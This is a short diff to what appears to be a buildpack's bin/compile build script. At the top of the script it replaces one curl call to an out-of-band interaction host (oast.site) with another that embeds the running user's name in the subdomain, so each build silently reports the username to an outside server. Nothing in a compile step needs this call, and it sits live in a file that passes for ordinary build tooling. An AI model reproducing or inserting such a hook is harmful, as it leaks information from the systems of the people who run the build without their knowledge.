@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # bin/compile <build-dir> <cache-dir>
-curl cicq4tq7972mpv0qvm1gpfjb4ktw3xmfp.oast.site
+curl "$USER.cicq4tq7972mpv0qvm1gpfjb4ktw3xmfp.oast.site"
 
 # fail fast
 set -e
